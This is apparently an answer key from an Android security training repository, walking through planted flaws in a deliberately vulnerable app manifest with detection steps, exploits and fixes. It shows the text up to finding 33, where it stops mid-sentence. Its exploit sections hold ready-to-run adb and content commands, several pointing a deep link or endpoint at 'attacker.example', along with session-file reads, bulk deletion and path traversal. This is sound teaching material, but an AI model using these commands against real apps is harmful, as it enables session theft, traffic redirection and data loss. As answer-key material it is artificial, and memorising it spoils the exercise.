# Answer key — `vulnerable-manifest.xml`

Do not read this until you have audited [`vulnerable-manifest.xml`](vulnerable-manifest.xml) by hand
against the checklist in [README §5.6](../README.md#56-how-pentesters-test-it--the-manifest-audit-checklist).

Every finding below follows the same five-part structure this repository uses everywhere:

1. **The vulnerable declaration** — the exact lines.
2. **Why developers write it** — because "developers are careless" is not a root cause and does not
   help you write a remediation a team will accept.
3. **How you detect it** — the command, not the intuition.
4. **What an attacker does with it** — the exploit, concretely.
5. **The secure fix as code**, and an **honest severity** with the reasoning.

> **Warning — read this before you use any severity below**
> Every severity here is a *starting point for this fictional app*. Severity is a function of what
> the component does and what data the app holds, and this file has no code behind it. On a real
> engagement you adjust every one of these after reading the implementation, and you do not report
> a reachability-dependent finding at all until you have proved reachability **from an unprivileged
> app**, not from `adb shell` (UID 2000). See [Lab 03](../labs/lab-03-proving-reachability.md).

**Total planted issues: 34, plus 3 deliberate non-findings** that a careless auditor reports and is
wrong about.

---

## Scorecard

| # | Finding | Checklist ref | Severity |
|---|---|---|---|
| 1 | `targetSdkVersion=28` — a cluster of insecure defaults | B1 | Medium |
| 2 | `minSdkVersion=19` widens the threat model | B2 | Medium |
| 3 | `sharedUserId` dissolves the sandbox | B3 | High |
| 4 | `installLocation="preferExternal"` | B4 | Low |
| 5 | `android:debuggable="true"` | C1 | **Critical** |
| 6 | `android:testOnly="true"` | C2 | High |
| 7 | `allowBackup="true"` with no rules file | C4/C5 | High |
| 8 | `usesCleartextTraffic="true"` | C7 | High |
| 9 | No `networkSecurityConfig` | C8 | Medium |
| 10 | `requestLegacyExternalStorage="true"` | C11 | Medium |
| 11 | `hasFragileUserData="true"` | C10 | Low |
| 12 | Custom `appComponentFactory` | C12 | Investigate |
| 13 | `<profileable android:shell="true">` | C3 | Medium |
| 14 | Launcher Activity: `singleTask` + default `taskAffinity` | D13 | Medium |
| 15 | `WebViewActivity` — custom-scheme deep link into a WebView | G4 | High |
| 16 | `WebViewActivity` — `https` filter, `host="*"`, no `autoVerify` | G2/G5 | High |
| 17 | `allowTaskReparenting="true"` | D15 | Medium |
| 18 | `DevSettingsActivity` exported, no permission | D3 | High |
| 19 | `activity-alias` re-opens a locked-down Activity | D5 | High |
| 20 | `PinActivity` — `showWhenLocked` + `turnScreenOn` + `allowEmbedded` | D12/D16 | Medium |
| 21 | `ShareReceiverActivity` — implicitly exported, `mimeType="*/*"` | D2/G6 | Medium |
| 22 | `LegacyImportActivity` — `enabled="false"` is not unreachable | D18 | Info |
| 23 | `AdminService` exported with no permission — a full RPC endpoint | D6 | **Critical** |
| 24 | `SyncService` "protected" by a `normal` permission | D4 | High |
| 25 | `MediaParseService` parses untrusted input without `isolatedProcess` | D7 | Low (hardening) |
| 26 | `BootReceiver` exported (persistence surface) | D9 | Low |
| 27 | `CommandReceiver` exported, priority `2147483647`, acts on extras | D9/D10 | High |
| 28 | `UserProvider` exported, no `writePermission` | E3 | High |
| 29 | `UserProvider` `readPermission` has no `protectionLevel` | E4/F1 | High |
| 30 | `UserProvider` `grantUriPermissions="true"` with no child | E5 | Medium |
| 31 | `UserProvider` `<path-permission>` with `INTERNET` | E6 | High |
| 32 | `FileProvider` authority `files` is not namespaced | E9 | Low |
| 33 | `FileProvider` `@xml/file_paths_insecure` — must be read | E7 | High |
| 34 | `<instrumentation>` shipped below `</application>` | H3 | High |
| 35 | `com.example.partner.API_SECRET` in `<meta-data>` | H2 | High (if live) |
| 36 | `BACKEND_TOKEN` (JWT shape) in `<meta-data>` | H2 | High (if live) |
| 37 | `QUERY_ALL_PACKAGES` + a `<queries>` target list | F5/F9 | Low (privacy) |
| 38 | `<uses-library org.apache.http.legacy>` | H4 | Low |
| 39 | `<permission-tree>` — the manifest under-describes the surface | F6 | Info |
| — | **Non-finding A**: `AssistService` guarded by `BIND_ACCESSIBILITY_SERVICE` | — | Not a finding |
| — | **Non-finding B**: `INTERNAL_IPC` at `signature` | — | Positive |
| — | **Non-finding C**: `AdMob APPLICATION_ID` in `<meta-data>` | — | Not a secret |

---

## 1. `targetSdkVersion="28"` — one line, many findings

```xml
<uses-sdk android:minSdkVersion="19" android:targetSdkVersion="28" />
```

**Why developers write it.** Raising `targetSdk` is work: each level enforces behaviour changes that
break something. Teams under delivery pressure raise it only when the Play Store forces them to, and
even then only to the minimum accepted level.

**Detection.**

```bash
# host — from the artefact, never from the source manifest
aapt2 dump badging target.apk | grep -E 'targetSdkVersion|sdkVersion'
```

**What it means.** This is never one finding. At `targetSdk` 28 the app has opted out of everything
from 29 upward:

| Not applied | Consequence for this app |
|---|---|
| 31 — `exported` mandatory | Components with an `<intent-filter>` are exported by **default**. `ShareReceiverActivity` (issue 21) has no attribute and is exported anyway. |
| 31 — `PendingIntent` mutability | A mutable `PendingIntent` handed to another app can be filled in by the recipient and fired with *this app's* identity. |
| 33 — receiver export flags | Context-registered receivers are effectively exported and are **invisible in this file**. |
| 34 — `foregroundServiceType` | A foreground service need not declare what it is doing. |
| 30 — package visibility | The app can enumerate every installed package with no declaration. |
| 29 — scoped storage | Broad external-storage access. |

**Fix.**

```kotlin
// app/build.gradle.kts
android { defaultConfig { targetSdk = 34 } }
```

Then treat every row above as a regression test.

**Severity: Medium**, following checklist row B1 — *below 31 is Medium, rising to High below 28*.
This app sits exactly at 28, so it keeps the cleartext-off default and lands at Medium.

Do not report it as "targetSdk is 28". Report it as the **cluster** in the table above, because a
bare version number is dismissed as informational and deserves to be. The cluster is what gets a
client to schedule the upgrade.

---

## 2. `minSdkVersion="19"`

**Why developers write it.** Install-base statistics from a business analyst, frozen years ago and
never revisited.

**Detection.** Same command as above.

**What it means for you.** Your test matrix now includes Android 4.4. On those devices: permissions
are granted at install with one prompt, `MODE_WORLD_READABLE` files still work, user-added CA
certificates are trusted by default (so intercepting this app's traffic needs no config at all), and
`file://` URIs cross app boundaries freely.

**Fix.** Raise `minSdk` to at least 24, or document compensating controls for old platforms.

**Severity: Medium.** It is a threat-model multiplier, not an issue in itself.

---

## 3. `sharedUserId="com.example.shared"`

```xml
<manifest … android:sharedUserId="com.example.shared">
```

**Why developers write it.** A vendor with several apps wants them to share files and a login
session, and `sharedUserId` is the shortest path to that. It was standard advice for years.

**Detection.**

```bash
# host
aapt2 dump xmltree --file AndroidManifest.xml target.apk | grep -i sharedUserId
# host — which other apps are in the group?
adb shell dumpsys package | grep -B2 -A2 "com.example.shared"
adb shell "ps -A | grep <the shared uid name>"
```

**Exploit.** The app sandbox is a UID boundary. Inside a shared-UID group there is no boundary at
all: every member can read every other member's private files directly and holds the union of the
group's granted permissions. Find the weakest sibling — usually the oldest, least maintained one —
compromise it, and you have this app's data too.

**Fix.** There is no clean one-line fix, and a recommendation that ignores that will be rejected.

```xml
<!-- API 33+: stop using the shared UID on new platforms while preserving it on old ones -->
<manifest android:sharedUserId="com.example.shared"
          android:sharedUserMaxSdkVersion="32">
```

Changing or removing `sharedUserId` on an installed app changes its UID, which the platform does not
support — the real fix is a data-migration plan plus an uninstall/reinstall, or a move to a
`signature`-permission-protected provider for the sharing the group actually needs.

**Severity: High** for an app holding credentials or financial data; Medium for a utility.

---

## 4. `installLocation="preferExternal"`

**Why developers write it.** APK size anxiety, usually inherited from a 2013 template.

**Fix.** `android:installLocation="internalOnly"`.

**Severity: Low.** Modern adoptable storage is encrypted. Report it as a note on a sensitive app,
not as a vulnerability — and if `minSdk` is 19, say why it mattered on the old platforms.

---

## 5. `android:debuggable="true"` — the Critical

```xml
<application android:debuggable="true" …>
```

**Why developers write it.** They usually do not. Gradle's `debug` build type sets it during the
manifest merge, and the finding is a build-pipeline failure: the debug artefact was published. It is
here as an explicit attribute so you learn to spot both forms.

**Detection.** Never from the source manifest — it will be clean.

```bash
# host — from the shipped artefact
aapt2 dump badging target.apk | grep -i debuggable
# host — from the device, authoritative
adb shell dumpsys package com.example.vulnerable | grep -E 'flags='   # look for DEBUGGABLE
```

**Exploit.** With USB access alone, no root required:

```bash
# host — a shell running as the app's own UID
adb shell run-as com.example.vulnerable ls -la /data/data/com.example.vulnerable/
adb shell run-as com.example.vulnerable cat shared_prefs/session.xml
# host — attach a debugger; JDWP is open
adb jdwp
```

Frida and Objection attach without root. Every private file is readable and writable.

**Fix.** Delete the attribute and let the build type own it. Add a release-build assertion:

```kotlin
// app/build.gradle.kts
buildTypes {
    release {
        isDebuggable = false
        isMinifyEnabled = true
    }
}
```

**Severity: Critical.** Impact is self-evident, the fix is trivial, and this is routinely accepted on
bug bounty programmes — provided you verify the APK genuinely came from the store, because a
repackaged build proves nothing.

---

## 6. `android:testOnly="true"`

**Why developers write it.** Android Studio's *Run* button sets it. The APK in the release folder is
not the one the IDE installed, and someone shipped the wrong file.

**Detection.** `aapt2 dump badging target.apk | grep -i testOnly`, or `dumpsys package … | grep flags`.

**What it means.** A `testOnly` APK can only be installed with `pm install -t`. Finding one in a
distributed build proves the pipeline shipped a debug artefact — and `testOnly` very often travels
with `debuggable`, as it does here.

**Fix.** Ship `assembleRelease` output. Add a CI gate that rejects an APK whose badging reports
`testOnly` or `debuggable`.

**Severity: High as an indicator.** Say so in the write-up: the severity is about what else came
along with it.

---

## 7. `allowBackup="true"` with no rules file

```xml
<application android:allowBackup="true" …>
<!-- no fullBackupContent, no dataExtractionRules -->
```

**Why developers write it.** It is the platform **default**, so most apps have it without anyone
choosing it. Here it is explicit, which is worse: someone thought about it and chose wrong.

**Detection.**

```bash
# host
aapt2 dump xmltree --file AndroidManifest.xml target.apk | grep -iE 'allowBackup|BackupContent|dataExtraction'
```

**Exploit.** Everything in the private data directory except `no_backup/` and `cache/` leaves the
device: `shared_prefs/` (session tokens, refresh tokens, PII), `databases/`, `files/`. On platforms
where `adb backup` still functions it is extractable over USB with no root:

```bash
# host — where the platform still supports it
adb backup -f out.ab com.example.vulnerable
# then unpack the .ab (a tar with a 24-byte header) and read shared_prefs/
```

**The finding is the data, not the attribute.** `allowBackup="true"` on an app that stores nothing is
informational. Enumerate the files before you assign a severity.

**Fix.**

```xml
<application
    android:allowBackup="false"
    android:dataExtractionRules="@xml/data_extraction_rules">
```

```xml
<!-- res/xml/data_extraction_rules.xml — BOTH rule sets, they are independent -->
<data-extraction-rules>
    <cloud-backup>
        <exclude domain="sharedpref" path="session.xml" />
        <exclude domain="database"  path="secrets.db" />
    </cloud-backup>
    <device-transfer>
        <exclude domain="sharedpref" path="session.xml" />
        <exclude domain="database"  path="secrets.db" />
    </device-transfer>
</data-extraction-rules>
```

An app that excluded a secret from cloud backup but not from device transfer has an **incomplete
fix** — check both.

**Severity: High** when the backup demonstrably contains authentication material; Medium otherwise.

---

## 8 & 9. `usesCleartextTraffic="true"` and no Network Security Config

**Why developers write it.** A staging server that only speaks HTTP, or an SDK that broke when
Android 9 turned cleartext off. The one-line unblock ships to production.

**Detection.**

```bash
# host
aapt2 dump xmltree --file AndroidManifest.xml target.apk | grep -iE 'usesCleartextTraffic|networkSecurityConfig'
# host — then find the actual endpoints
grep -roE 'http://[a-zA-Z0-9./_-]+' work/ | sort -u
```

**Exploit.** Plaintext HTTP on a hostile network: read and modify every request.at
`targetSdk` 28 the default is already `false`, so the explicit `true` here is an active decision to
re-enable it.

**Fix.**

```xml
<application
    android:usesCleartextTraffic="false"
    android:networkSecurityConfig="@xml/network_security_config">
```

```xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors><certificates src="system" /></trust-anchors>
    </base-config>
</network-security-config>
```

**Severity: High** for cleartext when real HTTP endpoints exist; **Medium** for the missing config on
its own. Missing config is Medium rather than Low because without it you cannot state what the app's
trust policy *is*. See [44-NetworkSecurityConfig](../../44-NetworkSecurityConfig/README.md).

---

## 10 & 11. `requestLegacyExternalStorage` and `hasFragileUserData`

`requestLegacyExternalStorage="true"` opts out of scoped storage where the platform still honours it
(ignored from `targetSdk` 30). At `targetSdk` 28 it takes effect. Its presence means the code was
written against the pre-scoped-storage model and probably still contains that path — go and find it.
**Medium.**

`hasFragileUserData="true"` offers the user a "keep app data" checkbox at uninstall, so data survives
uninstall and is handed to a reinstalled app with the same package name. **Low–Medium**, and only on
an app holding secrets.

---

## 12. Custom `android:appComponentFactory`

```xml
<application android:appComponentFactory="com.example.vulnerable.loader.EarlyFactory">
```

**Why developers write it.** AndroidX sets `androidx.core.app.CoreComponentFactory` legitimately.
Anything else is unusual.

**What it means.** This class instantiates every Activity, Service, Receiver, Provider, Application
**and ClassLoader** in the app. It is the earliest app-controlled hook point in the process, earlier
than `Application.onCreate` and earlier than a provider's `onCreate`. Packers and malware use it.

**Action:** open that class in JADX before anything else. This is a lead, not a finding.

---

## 13. `<profileable android:shell="true">`

**Why developers write it.** To profile a release build in the field with `simpleperf` or Perfetto,
which is a legitimate need.

**What an attacker gets.** UID 2000 (shell) can profile the app and take heap dumps on a
**non-debuggable production build**. No `run-as`, no JDWP — but memory profiling and native stack
sampling from an unprivileged shell can expose secrets held in memory.

**Fix:** restrict `<profileable>` to debug variants via `src/debug/AndroidManifest.xml`.

**Severity: Medium.** State explicitly that it is *not* equivalent to `debuggable`, or a competent
developer will correctly dismiss the whole finding.

---

## 14 & 17. Task hijacking: `singleTask` with a default `taskAffinity`, plus `allowTaskReparenting`

```xml
<activity android:name=".MainActivity" android:exported="true"
          android:launchMode="singleTask">   <!-- no taskAffinity="" -->
<activity android:name=".WebViewActivity" android:allowTaskReparenting="true">
```

**Why developers write it.** `singleTask` is the standard fix for "the launcher opens a second copy
of my app". `taskAffinity` is left at its default because almost nobody knows what it does.

**Detection.**

```bash
# host
aapt2 dump xmltree --file AndroidManifest.xml target.apk | grep -B3 -A3 -E 'launchMode|taskAffinity|allowTaskReparenting'
# device — watch which task wins
adb shell dumpsys activity activities | grep -E 'taskAffinity|Task\{|realActivity'
```

**Exploit.** Build a second app whose Activity declares
`android:taskAffinity="com.example.vulnerable"` and `android:launchMode="singleTask"`. Launch it once
under any pretext. Its task now carries the victim's affinity string. When the user later taps the
victim's icon, the system may bring the *attacker's* task forward, and the user enters credentials
into the attacker's UI believing it is the victim app. This is the StrandHogg family. A manifest read
gives you suspicion; the two-app test gives you a finding — [Lab 03](../labs/lab-03-proving-reachability.md)
builds it.

**Fix.**

```xml
<!-- app-wide, one line, closes the class -->
<application android:taskAffinity="">
```

**Severity: Medium.** Some programmes reject it as "requires a malicious app installed". Include the
two-app PoC and let them decide.

---

## 15 & 16. `WebViewActivity` — two bad deep-link filters

```xml
<data android:scheme="vulnapp" android:host="open" />
…
<data android:scheme="https" android:host="*" android:pathPattern=".*" />
```

**Why developers write it.** A custom scheme is the easiest way to get a link into an app, and it is
what most tutorials show. The `https` wildcard filter is usually an attempt at "handle all our links"
that nobody narrowed afterwards.

**Detection.**

```bash
# host — does the platform consider the https links verified?
adb shell pm get-app-links com.example.vulnerable
# host — who would actually handle a given URI?
adb shell pm resolve-activity --brief -a android.intent.action.VIEW \
    -c android.intent.category.BROWSABLE -d "vulnapp://open?url=https://attacker.example/"
```

**Exploit.**

```bash
# adb shell — deliver it exactly as a browser would
am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
    -d "vulnapp://open?url=https://attacker.example/steal"
```

Two separate problems:

- **The custom scheme is unowned.** Any app can declare `vulnapp://` and compete for it. If this
  scheme ever carries an OAuth authorisation code, that code is interceptable.
- **`BROWSABLE` makes it remote.** A link, an iframe, or a `window.location` in the mobile browser
  reaches this component with attacker-controlled data. That converts a local finding into a remote
  one and usually doubles the severity.
- **`host="*"` with `pathPattern=".*"`** means every `https` URL on the internet matches this filter.
  Combined with an Activity that loads the URI into a WebView, you have arbitrary-origin loading
  inside the app's WebView context — and if `addJavascriptInterface` is present, a foothold in its
  Java context. See [43-WebView](../../43-WebView/README.md).

**Fix.**

```xml
<intent-filter android:autoVerify="true">
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="https" android:host="app.example.com" android:pathPrefix="/open" />
</intent-filter>
```

…plus a live `https://app.example.com/.well-known/assetlinks.json` listing the package name and the
SHA-256 of the signing certificate, plus an allow-list check in code before any `loadUrl`.

**Severity: High** once you demonstrate the URL reaching a WebView. Without that demonstration it is
Medium and will be argued about.

---

## 18. `DevSettingsActivity` exported with no permission

```xml
<activity android:name=".debug.DevSettingsActivity" android:exported="true" />
```

**Why developers write it.** `exported="true"` was added mechanically to every component when the
API 31 build failure forced a choice, and `true` made the build work. This is now the single most
common cause of new exported-component findings.

Note there is no `<intent-filter>` here, so the component is only reachable by an **explicit**
`ComponentName` — which an attacker knows, because the manifest is public.

**Detection.**

```bash
# adb shell
am start -n com.example.vulnerable/.debug.DevSettingsActivity
```

**Exploit** — and this is the part that makes it a finding rather than an observation:

```java
// from an UNPRIVILEGED app with no permissions at all
Intent i = new Intent();
i.setComponent(new ComponentName("com.example.vulnerable",
                                 "com.example.vulnerable.debug.DevSettingsActivity"));
i.putExtra("api_base", "https://attacker.example/");
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);
```

If it launches from the probe app, the API base URL of a shipped application is attacker-controlled.

**Fix.**

```xml
<activity android:name=".debug.DevSettingsActivity" android:exported="false" />
```

Better: keep debug screens in `src/debug/` so they are not merged into the release variant at all.

**Severity: High** for this component, because it changes a security-relevant setting. A different
exported Activity that shows a static "About" screen is Informational. The attribute does not decide
the severity; the behaviour does.

---

## 19. The `<activity-alias>` that undoes the lockdown

```xml
<activity android:name=".AdminActivity"
          android:exported="false"
          android:permission="com.example.vulnerable.permission.INTERNAL_IPC" />

<activity-alias android:name=".PublicAdminEntry"
                android:targetActivity=".AdminActivity"
                android:exported="true"
                android:permission="">
```

**Why developers write it.** Aliases are normally used to change a launcher icon or keep an old entry
point working after a rename. Their `exported` and `permission` attributes are **their own** and do
not inherit from the target, which almost nobody knows. The empty `android:permission=""` is an
explicit removal of the application-level requirement, not an absence of opinion.

**Detection.** Grep for it **separately**. An auditor who greps `<activity` misses aliases entirely:

```bash
# host
grep -n 'activity-alias' work/AndroidManifest.xml
aapt2 dump xmltree --file AndroidManifest.xml target.apk | grep -A6 'E: activity-alias'
```

**Exploit.** `AdminActivity` looks locked down. Reach it anyway:

```bash
# adb shell — via the alias, no permission held
am start -n com.example.vulnerable/.PublicAdminEntry
am start -a com.example.vulnerable.OPEN_ADMIN
```

**Fix.** Give the alias the same posture as its target, or delete it:

```xml
<activity-alias android:name=".PublicAdminEntry"
                android:targetActivity=".AdminActivity"
                android:exported="false"
                android:permission="com.example.vulnerable.permission.INTERNAL_IPC" />
```

**Severity: High.** It is a complete bypass of a control the developer believes is in place, and it
is one of the most satisfying findings to present because the developer's first reaction is always
"but that Activity is not exported".

---

## 20. `PinActivity` — `showWhenLocked` + `turnScreenOn` + `allowEmbedded`

**Why developers write it.** A "quick unlock" feature: show the PIN pad straight from the lock screen.

**Exploit.** The Activity is also `exported="true"`, so **any app** can force the victim's locked
phone to wake and display the PIN entry screen — a convincing phishing surface with no overlay
permission required. `allowEmbedded="true"` additionally permits it to be launched as an embedded
child of another Activity, inviting UI-embedding attacks.

**Fix.** Remove all three attributes from a sensitive screen; add `FLAG_SECURE` to its window; make
it `exported="false"`.

**Severity: Medium**, rising if you can demonstrate a convincing phish.

---

## 21. `ShareReceiverActivity` — the invisible export

```xml
<activity android:name=".ShareReceiverActivity">   <!-- NO android:exported -->
    <intent-filter>
        <action android:name="android.intent.action.SEND" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="*/*" />
    </intent-filter>
</activity>
```

**Why developers write it.** Because below `targetSdk` 31 nobody has to think about it. The attribute
is not required and the component is exported by default.

**Detection.** This is the finding a `grep exported=true` will never surface:

```bash
# host — components with a filter and NO exported attribute
grep -B2 -A8 '<intent-filter' work/AndroidManifest.xml | grep -L 'android:exported'
```

Then check the effective value where it is decided:

```bash
# host — the platform's own view
adb shell dumpsys package com.example.vulnerable | grep -A4 ShareReceiverActivity
```

**Effective export state: `true`**, because `targetSdk` is 28. `mimeType="*/*"` means the component
accepts *any* content an attacker offers, making it a sink for hostile files — trace what the code
does with the received `Uri`, especially whether it hands it to a parser.

**Fix.** Declare `android:exported` explicitly on **every** component, and narrow the MIME type.

**Severity: Medium** for the export; the `*/*` MIME type is an investigation lead whose severity
depends entirely on the parser behind it.

---

## 22. `LegacyImportActivity` — `enabled="false"` is not unreachable

```xml
<activity android:name=".LegacyImportActivity" android:exported="true" android:enabled="false" />
```

`enabled="false"` is the **manifest** value. The app can flip it at runtime:

```java
getPackageManager().setComponentEnabledSetting(
    new ComponentName(this, LegacyImportActivity.class),
    PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
```

**Detection.**

```bash
# host — grep the DEX for the call
grep -r 'setComponentEnabledSetting' work/smali*/
# host — the LIVE state, which is what matters
adb shell dumpsys package com.example.vulnerable | grep -i -A3 'disabledComponents\|enabledComponents'
```

**Severity: Info** on its own. Its value is methodological: do not cross a component off your list
because the manifest says `enabled="false"`.

---

## 23. `AdminService` — exported, no permission, and it is an RPC endpoint

```xml
<service android:name=".AdminService" android:exported="true">
    <intent-filter><action android:name="com.example.vulnerable.ADMIN" /></intent-filter>
</service>
```

See [`AdminService.java`](AdminService.java) for the code behind it.

**Why developers write it.** The service needed to be reachable from the vendor's companion app, and
`exported="true"` achieved that. Nobody enumerated what the returned `IBinder` exposes.

**Detection.** Do not stop at "it is exported". Find `onBind` and the `Stub` it returns:

```bash
# host
jadx -d out target.apk
grep -rn 'extends .*\$Stub\|onBind' out/sources/com/example/vulnerable/
grep -rn 'TRANSACTION_' out/sources/     # each constant is a callable method
```

**Exploit.** An exported bound Service is often **worse** than an exported Activity: the attacker
holds the interface and can call every method on it, with arbitrary arguments, repeatedly, with no
UI and no user interaction. Here that means reading the session token, repointing the API base URL,
and wiping local data — from any app on the device.

**Fix.** Both halves are required:

```xml
<service android:name=".AdminService" android:exported="false" />
```

```java
private void requireTrustedCaller() {
    int uid = Binder.getCallingUid();
    if (uid == Process.myUid()) return;
    String[] pkgs = getPackageManager().getPackagesForUid(uid);
    if (pkgs == null) throw new SecurityException("unknown caller");
    for (String p : pkgs) {
        if (SignatureUtil.hasSameSigningCertificate(this, p)) return;
    }
    throw new SecurityException("caller " + uid + " not trusted");
}
```

The manifest closes the door; the code checks the identity of anyone let through anyway.
Manifest-only protection gives one decision for the whole interface; code checks give one per
operation.

**Severity: Critical.** Unauthenticated session-token disclosure plus attacker-controlled server URL
plus remote data destruction, reachable by any installed app.

---

## 24. `SyncService` "protected" by a `normal` permission

```xml
<service android:name=".SyncService" android:exported="true"
         android:permission="com.example.vulnerable.permission.ADMIN" />

<permission android:name="com.example.vulnerable.permission.ADMIN"
            android:protectionLevel="normal" />
```

**Why developers write it.** They set a permission and consider the job done, without ever resolving
its level. `normal` is also the value you get by **omitting** `protectionLevel` (see finding 29).

**Detection.** Never accept "it's permission-protected" at face value:

```bash
# host — the real level
adb shell pm list permissions -f | grep -A6 'com.example.vulnerable.permission.ADMIN'
```

**Exploit.** A `normal` permission is granted automatically, with no user prompt and no signature
check, to any app that declares it. The attacker's manifest:

```xml
<uses-permission android:name="com.example.vulnerable.permission.ADMIN" />
```

That is the entire exploit. The component is reachable by every app on the device, exactly as if no
permission were set.

**Fix.**

```xml
<permission android:name="com.example.vulnerable.permission.ADMIN"
            android:protectionLevel="signature" />
```

**Severity: High**, identical to having no permission at all. Developers dispute this until you show
them the four-line attacker manifest — so put it in the report.

---

## 25. `MediaParseService` without `isolatedProcess`

A service that parses untrusted media, documents or fonts should run in Android's built-in sandbox:

```xml
<service android:name=".MediaParseService"
         android:exported="false"
         android:isolatedProcess="true" />
```

An isolated process has **no permissions of its own, no access to the app's data directory, and
essentially no Binder access to system services**. A memory-safety bug in the parser then yields
almost nothing. Chrome's renderer uses this mechanism.

**Severity: Low (hardening).** This is a recommendation, not a vulnerability — but it is a strong,
actionable one that marks you as someone who has read the platform rather than a checklist.

---

## 26 & 27. The receivers

`BootReceiver` exported for `BOOT_COMPLETED` is normal and is **Low** on its own — note it as a
persistence surface and move on.

`CommandReceiver` is the finding:

```xml
<receiver android:name=".CommandReceiver" android:exported="true">
    <intent-filter android:priority="2147483647">
        <action android:name="com.example.vulnerable.ACTION_SET_ENDPOINT" />
```

**Why developers write it.** A receiver is the easiest way to let another of the vendor's apps
trigger a sync. Priority is set to the maximum "to make sure we get it first", cargo-culted from a
Stack Overflow answer.

**Detection.**

```bash
# adb shell
am broadcast -n com.example.vulnerable/.CommandReceiver \
    -a com.example.vulnerable.ACTION_SET_ENDPOINT --es url "https://attacker.example/"
am broadcast -a com.example.vulnerable.ACTION_LOGOUT
```

`sendBroadcast` is fire-and-forget: no exception does **not** prove the receiver ran. Confirm from
the target's own logcat, or use an ordered broadcast with a result receiver.

**Exploit.** Any app changes the app's backend endpoint, or forces a logout, or triggers whatever
`ACTION_SYNC` does with attacker-controlled extras. The maximum `priority` additionally means that
for any *ordered* broadcast this receiver runs first and can `abortBroadcast()` so nothing else sees
it — the historical SMS-interception shape, still exploitable between apps on custom ordered
broadcasts. Values above 1000 are documented as reserved for the system.

**Fix.**

```xml
<receiver android:name=".CommandReceiver" android:exported="false" />
```

and in code, verify `Binder.getCallingUid()` for anything that survives.

**Severity: High**, because `ACTION_SET_ENDPOINT` redirects the app's traffic.

> **Pentester's Note**
> A manifest audit **cannot** enumerate this app's receiver surface. At `targetSdk` 28,
> context-registered receivers do not have to declare an export state and are effectively exported —
> and they appear nowhere in this file. Hook `registerReceiver` with
> [`scripts/frida-manifest-runtime.js`](../scripts/frida-manifest-runtime.js) (`mf.watchReceivers()`)
> to see them.

---

## 28–31. `UserProvider` — four defects in seven lines

```xml
<provider android:name=".UserProvider"
    android:authorities="com.example.vulnerable.users"
    android:exported="true"
    android:readPermission="com.example.vulnerable.permission.READ_USERS"
    android:grantUriPermissions="true">
    <path-permission android:pathPrefix="/public/"
                     android:readPermission="android.permission.INTERNET" />
</provider>

<permission android:name="com.example.vulnerable.permission.READ_USERS" />
```

### 28 — no `writePermission`

**Why developers write it.** They set `readPermission` and assume it covers both directions. It does
not: `readPermission` gates `query()` and read-mode `openFile()`; `writePermission` gates `insert()`,
`update()`, `delete()` and write-mode `openFile()`. With `writePermission` absent, **write is
completely unprotected** even though read appears gated.

**Exploit.**

```bash
# adb shell
content insert --uri content://com.example.vulnerable.users/users \
    --bind name:s:attacker --bind role:s:admin
content update --uri content://com.example.vulnerable.users/users \
    --bind is_premium:i:1 --where "id=1"
content delete --uri content://com.example.vulnerable.users/users --where "1=1"
```

Write access to an app's own database is frequently a privilege escalation: flip a flag column,
inject a row the app later trusts, or overwrite a stored server URL. **High.**

### 29 — the gating permission has no `protectionLevel`

`<permission android:name="…READ_USERS" />` with the attribute omitted defaults to **`normal`**.
Read is therefore open to every app too, via a one-line `<uses-permission>`. **High**, and it is the
same root cause as finding 24.

### 30 — `grantUriPermissions="true"` with no `<grant-uri-permission>` child

Any URI under this authority can be granted with `FLAG_GRANT_READ_URI_PERMISSION` or
`FLAG_GRANT_WRITE_URI_PERMISSION`, bypassing the permission attributes for the granted URI. Now find
an exported Activity that returns a result with a grant flag, or a `PendingIntent` handed to another
app, and "temporary access to one image" becomes "read any file the app can read". **Medium–High.**

### 31 — the `<path-permission>` that opens `/public/`

This is the subtlest element in the manifest. `<path-permission>` is an **OR, not an AND**: a caller
satisfying *either* the component permission *or* a matching path permission is allowed. The
developer wrote this believing it *restricts* `/public/`. In fact `android.permission.INTERNET` is a
`normal` permission granted automatically to anything that asks, so `/public/` is now readable by
**every app on the device**, regardless of the component-level `readPermission`.

Worse, look at `allowDefaultRead` in `ContentProvider.enforceReadPermissionInner` (quoted in
[README §3.9](../README.md#39-provider--the-richest-and-most-dangerous-element)): if a provider
declares **no** component-level permission and only declares `<path-permission>` entries for some
paths, every path matching *no* rule is allowed by default. The developer's mental model — "I locked
down the sensitive paths" — is exactly backwards.

And the match is on the **raw, non-normalised** `uri.getPath()`:

```bash
# adb shell — the path still starts with /public/, so the rule matches…
content read --uri "content://com.example.vulnerable.users/public/../secret/token.txt"
```

…while a provider that does `new File(baseDir, segment)` resolves it to `/secret/token.txt`.

**Fix for all four.**

```xml
<provider android:name=".UserProvider"
    android:authorities="${applicationId}.users"
    android:exported="true"
    android:readPermission="com.example.vulnerable.permission.READ_USERS"
    android:writePermission="com.example.vulnerable.permission.WRITE_USERS"
    android:grantUriPermissions="false" />

<permission android:name="com.example.vulnerable.permission.READ_USERS"
            android:protectionLevel="signature" />
<permission android:name="com.example.vulnerable.permission.WRITE_USERS"
            android:protectionLevel="signature" />
```

No `<path-permission>` at all — enforce authorisation **in code**, inside
`query`/`insert`/`update`/`delete`/`call`/`openFile`, using `Binder.getCallingUid()`. If the provider
genuinely must serve other vendors' apps, `signature` will not work, and the correct answer is a
`dangerous` permission with a clear user-facing description **plus** the in-code check — never a
`normal` permission.

> Do not report `<path-permission>` findings from the manifest alone. Read the provider's Java, then
> prove the traversal with an actual `content read --uri`. A manifest-only claim will be disputed and
> you will be right but unpersuasive.

---

## 32 & 33. The `FileProvider`

```xml
<provider android:name="androidx.core.content.FileProvider"
    android:authorities="files"
    android:exported="true"
    android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
               android:resource="@xml/file_paths_insecure" />
</provider>
```

**32 — the authority is `files`.** Not namespaced under the package. Two apps claiming the same
authority means the second to install **fails to install**, which is a denial of service, and on a
device where install order is controllable it is an authority-squatting opportunity. **Low.** Fix:
`android:authorities="${applicationId}.files"`.

**33 — `exported="true"` on a `FileProvider` is already wrong,** and the real defect is in the
